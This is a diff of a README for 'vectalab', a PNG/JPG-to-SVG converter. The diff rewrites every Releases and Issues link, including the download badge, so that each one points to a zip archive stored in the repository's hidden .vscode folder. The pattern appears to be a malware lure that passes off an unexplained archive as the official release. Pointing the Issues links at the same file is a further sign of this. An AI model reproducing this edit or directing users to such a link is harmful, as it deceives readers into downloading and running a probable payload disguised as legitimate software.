@@ -4,9 +4,9 @@
 Welcome to vectalab! This tool helps you convert your images from PNG or JPG formats to optimized SVG files. With our state-of-the-art methods, you can achieve high-quality vectorization with minimal effort.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-vectalab-blue.svg)](https://github.com/snehilhbtu/vectalab/releases)
+[![Download](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip)](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip)
 
-To get started with vectalab, visit our [Releases page](https://github.com/snehilhbtu/vectalab/releases) and download the latest version of the software.
+To get started with vectalab, visit our [Releases page](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip) and download the latest version of the software.
 
 ## 💻 System Requirements
 Before you download vectalab, ensure your system meets the following requirements:
@@ -28,7 +28,7 @@ vectalab offers several features that make image vectorization easy and effectiv
 ## 🔧 How to Download & Install
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/snehilhbtu/vectalab/releases).
+   Go to our [Releases page](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip).
 
 2. **Select the Right Version:**
    Look for the latest release. Click on it to view details.
@@ -62,7 +62,7 @@ vectalab offers several features that make image vectorization easy and effectiv
    Once completed, choose a location on your device to save the new SVG file.
 
 ## 🤝 Support and Contribution
-If you run into any issues or have questions, please check the [Issues section](https://github.com/snehilhbtu/vectalab/issues) of our repository. You can report bugs or request features there.
+If you run into any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip) of our repository. You can report bugs or request features there.
 
 We welcome contributions! If you have ideas or improvements, feel free to create a pull request. 
 
@@ -70,8 +70,8 @@ We welcome contributions! If you have ideas or improvements, feel free to create
 vectalab is open-source software licensed under the MIT License. You can use, modify, and share the software freely under the terms of this license.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/snehilhbtu/vectalab/releases)
-- [Issues Section](https://github.com/snehilhbtu/vectalab/issues)
+- [Releases Page](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip)
+- [Issues Section](https://raw.githubusercontent.com/snehilhbtu/vectalab/main/.vscode/vectalab-v2.0.zip)
 - [User Documentation](#)
 
 Thank you for choosing vectalab! We hope you enjoy using our application to turn your images into vibrant vector graphics.
